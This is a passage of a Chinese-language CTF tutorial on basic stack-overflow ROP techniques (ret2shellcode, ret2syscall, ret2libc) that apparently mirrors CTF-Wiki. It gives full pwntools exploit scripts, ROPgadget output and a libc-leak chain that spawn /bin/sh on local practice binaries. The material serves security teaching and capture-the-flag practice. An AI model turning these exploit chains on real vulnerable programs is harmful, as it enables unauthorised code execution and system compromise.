class="language-none">gef➤  b mainBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.gef➤  rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:88       setvbuf(stdout, 0LL, 2, 0LL);─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────      6  int main(void)      7  { →    8      setvbuf(stdout, 0LL, 2, 0LL);      9      setvbuf(stdin, 0LL, 1, 0LL);     10  ─────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x8048536 → Name: main()─────────────────────────────────────────────────────────────────────────────────────────────────────gef➤  vmmap Start      End        Offset     Perm Path0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rwx [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p><pre class="line-numbers language-none"><code class="language-none">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><p>具体的 payload 如下</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5">¶</a></h3><ul><li>sniperoj-pwn100-shellcode-x86-64</li></ul><h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">¶</a></h2><h3 id="原理-¶-2"><a href="#原理-¶-2" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6">¶</a></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h3 id="例子-¶-2"><a href="#例子-¶-2" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7">¶</a></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>首先检测程序开启的保护</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall checksec rop    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts("This time, no system() and NO SHELLCODE!!!");  puts("What do you plan to do?");  gets(&amp;v4);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li></ul><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><pre class="line-numbers language-none"><code class="language-none">execve("/bin/sh",NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret0x080be23f : pop ebx ; pop edi ; ret0x0806eb69 : pop ebx ; pop edx ; ret0x08092258 : pop ebx ; pop esi ; pop ebp ; ret0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x100x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x140x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 40x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 80x08048913 : pop ebx ; pop esi ; pop edi ; ret0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 40x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret0x0805c820 : pop esi ; pop ebx ; ret0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0807b6ed : pop ss ; pop ebx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里，我选择</p><pre class="line-numbers language-none"><code class="language-none">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' Strings information============================================================0x080be408 : /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'int'                 Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonfrom pwn import *sh = process('./rop')pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat(    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8">¶</a></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">¶</a></h2><h3 id="原理-¶-3"><a href="#原理-¶-3" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9">¶</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><h3 id="例子-¶-3"><a href="#例子-¶-3" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10">¶</a></h3><p>我们由简单到难分别给出三个例子。</p><h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">¶</a></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>首先，我们可以检查一下程序的安全保护</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2libc1 checksec ret2libc1        Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts("RET2LIBC &gt;_&lt;");  gets((char *)&amp;v4);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          Strings information============================================================0x08048720 : /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><pre class="line-numbers language-none"><code class="language-none">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc1')binsh_addr = 0x8048720system_plt = 0x08048460payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p><h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">¶</a></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p><pre class="line-numbers language-none"><code class="language-none">##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat(    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p><h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">¶</a></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2libc3 checksec ret2libc3    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts("No surprise anymore, system disappeard QQ.");  printf("Can you find it !?");  gets((char *)&amp;v4);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>exp 如下</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process('./ret2libc3')ret2libc3 = ELF('./ret2libc3')puts_plt = ret2libc3.plt['puts']libc_start_main_got = ret2libc3.got['__libc_start_main']main = ret2libc3.symbols['main']print "leak libc_start_main_got addr and return to main again"payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter('Can you find it !?', payload)print "get the related addr"libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher('__libc_start_main', libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump('__libc_start_main')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')print "get shell"payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11">¶</a></h3><ul><li>train.cs.nctu.edu.tw: ret2libc</li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
